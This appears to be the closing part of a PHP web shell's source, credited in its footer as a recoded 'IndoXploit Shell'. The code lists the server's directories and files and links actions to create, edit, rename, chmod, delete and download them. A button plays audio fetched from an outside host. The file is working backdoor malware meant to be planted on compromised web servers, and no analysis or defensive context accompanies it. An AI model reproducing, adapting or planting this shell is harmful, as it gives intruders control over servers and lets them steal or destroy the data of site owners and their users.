 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a> | <a href='?act=chmod_dir&dir=$dir/$dirx'>chmod</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg=='>&nbsp;$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>&nbsp;$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=chmod&dir=$dir&file=$dir/$file'>chmod</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<br>";
			
		}
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'>Recoded IndoXploit Shell By Unknown1337";
	}
?> 
<br><center> <audio id="myAudio"> <source src="https://a.top4top.io/m_2190a47980.mp3" type="audio/ogg"></audio> <button onclick="playAudio()" style="background: black; border-radius:10px; font-family:Iceberg;"><font style="font-family:Iceberg; text-decoration:bold; text-shadow: 2px 0 1px orangedark, 1px 2px 0 bluedark;" color="white" size="10"><b> PLAY</b></font></button><font color="grey">----</font><button onclick="pauseAudio()" style="background: black; border-radius:10px; font-family:Iceberg;"><font style="font-family:Iceberg; text-decoration:bold; text-shadow: 2px 0 1px orangedark, 1px 2px 0 bluedark;" color="white" size="10"><b>STOP</button></center> <script> var x = document.getElementById("myAudio"); function playAudio() { x.play(); } function pauseAudio() { x.pause(); } </script>
<br><br>
</html>
